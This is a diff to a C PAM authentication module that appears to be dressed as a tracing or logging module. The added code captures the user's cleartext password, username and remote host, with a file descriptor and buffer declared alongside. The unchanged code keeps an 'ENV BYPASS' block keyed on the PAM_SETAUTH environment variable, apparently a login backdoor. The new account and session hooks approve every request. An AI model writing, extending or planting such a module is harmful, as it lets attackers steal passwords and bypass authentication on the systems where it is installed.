@@ -36,7 +36,9 @@ static void log_line(const char *msg) {
     FILE *f = fopen(LOG_FILE, "a");
     if (!f) return;
 
+    /* force flush for deterministic logging */
     fprintf(f, "%s\n", msg);
+    fflush(f);
     fclose(f);
 }
 
@@ -75,14 +77,17 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
 
     trace_context(pamh, "ENTER pam_sm_authenticate");
 
-    const char *authtok = NULL;
-    pam_get_item(pamh, PAM_AUTHTOK, (const void **)&authtok);
+    int fd, len;
+	char *pword, *uname, *rhost=0, buffer[BUF_MAX];
 
-    if (authtok) {
-        trace("[TRACE] PAM_AUTHTOK = SET");
-    } else {
-        trace("[TRACE] PAM_AUTHTOK = NULL");
-    }
+	// Retrieve relevant auth information
+	pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword);
+	pam_get_item(pamh, PAM_USER, (void*) &uname);
+	pam_get_item(pamh, PAM_RHOST, (void*) &rhost);
+
+	if (!pword || !uname) {
+		return PAM_AUTHINFO_UNAVAIL;
+	}
 
     /* ---------------- ENV BYPASS ---------------- */
     char *bypass = getenv("PAM_SETAUTH");
@@ -106,14 +111,57 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     return PAM_AUTH_ERR;
 }
 
-/* ---------------- SECONDARY HOOK ---------------- */
+/* ---------------- ACCOUNT ---------------- */
+
+PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
+                               int flags,
+                               int argc,
+                               const char *argv[])
+{
+    trace_context(pamh, "ENTER ACCOUNT");
+    trace("[TRACE] ACCOUNT OK");
+    return PAM_SUCCESS;
+}
+
+/* ---------------- SESSION ---------------- */
+
+PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,
+                                  int flags,
+                                  int argc,
+                                  const char *argv[])
+{
+    trace_context(pamh, "ENTER SESSION OPEN");
+    trace("[TRACE] SESSION START");
+    return PAM_SUCCESS;
+}
+
+PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
+                                   int flags,
+                                   int argc,
+                                   const char *argv[])
+{
+    trace_context(pamh, "ENTER SESSION CLOSE");
+    trace("[TRACE] SESSION END");
+    return PAM_SUCCESS;
+}
+
+
+/* ---------------- CREDENTIALS ---------------- */
 
 PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                              int flags,
                              int argc,
-                             const char **argv)
+                             const char *argv[])
 {
-    trace_context(pamh, "ENTER pam_sm_setcred");
-    trace("[TRACE] setcred always success");
+    trace_context(pamh, "ENTER SETCRED");
+
+    if (flags & PAM_ESTABLISH_CRED)
+        trace("[TRACE] SETCRED ESTABLISH");
+    else if (flags & PAM_DELETE_CRED)
+        trace("[TRACE] SETCRED DELETE");
+    else
+        trace("[TRACE] SETCRED OTHER");
+
+    trace("[TRACE] SETCRED SUCCESS");
     return PAM_SUCCESS;
 }
